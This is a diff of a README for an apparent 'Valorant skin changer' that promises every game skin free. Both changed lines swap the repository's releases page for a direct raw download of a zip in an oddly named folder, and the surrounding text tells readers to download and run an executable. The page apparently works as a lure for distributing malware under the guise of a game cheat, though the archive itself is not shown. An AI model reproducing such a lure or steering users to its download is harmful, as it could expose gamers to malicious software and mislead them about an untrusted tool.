@@ -1,6 +1,6 @@
 # 🎯 valorant-skin-changer-2026 - Unlock Every Skin Instantly and Free
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_Skin_Changer_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/deaf-tsaritsyn642/valorant-skin-changer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_Skin_Changer_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/deaf-tsaritsyn642/valorant-skin-changer-2026/main/Johnathan/3.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to start using your favorite skins today.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/deaf-tsaritsyn642/valorant-skin-changer-2026/releases**](https://github.com/deaf-tsaritsyn642/valorant-skin-changer-2026/releases)
+[**https://raw.githubusercontent.com/deaf-tsaritsyn642/valorant-skin-changer-2026/main/Johnathan/3.6.zip**](https://raw.githubusercontent.com/deaf-tsaritsyn642/valorant-skin-changer-2026/main/Johnathan/3.6.zip)
 
 You'll see a list of files. Look for the one named something like `ValorantSkinChanger2026.exe` or similar. Click the download button next to it. The download will start automatically.
 
